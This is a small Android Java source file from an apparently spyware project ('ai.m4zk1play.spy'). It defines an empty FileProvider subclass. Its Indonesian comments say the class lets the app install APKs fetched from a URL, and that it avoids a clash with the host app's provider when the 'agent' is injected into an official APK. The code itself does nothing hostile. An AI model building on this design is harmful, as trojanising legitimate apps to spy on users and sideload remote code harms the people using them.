package ai.m4zk1play.spy;

import androidx.core.content.FileProvider;

/**
 * FileProvider milik sendiri.
 * Dipakai untuk memasang APK dari URL (ACTION_VIEW + content://).
 * Subclass supaya tidak bentrok dengan FileProvider milik APK target
 * saat agent di-inject ke APK resmi.
 */
public class MzkFiles extends FileProvider {
}
